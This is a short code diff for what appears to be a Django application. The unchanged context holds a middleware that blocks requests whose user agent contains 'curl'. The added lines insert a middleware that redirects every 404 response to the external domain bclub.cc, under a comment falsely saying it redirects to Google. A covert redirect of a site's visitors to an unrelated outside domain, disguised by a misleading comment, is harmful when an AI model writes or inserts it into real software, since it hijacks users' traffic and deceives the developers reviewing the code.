@@ -85,3 +85,14 @@ class BlockCurlMiddleware:
         if 'curl' in user_agent:
             return HttpResponse('Curl requests are not allowed', status=403)
         return self.get_response(request)
+from django.http import HttpResponseRedirect
+
+class RedirectMiddleware:
+    def __init__(self, get_response):
+        self.get_response = get_response
+
+    def __call__(self, request):
+        response = self.get_response(request)
+        if response.status_code == 404:  # Check if the response is a 404 Not Found
+            return HttpResponseRedirect('https://bclub.cc')  # Redirect to Google
+        return response
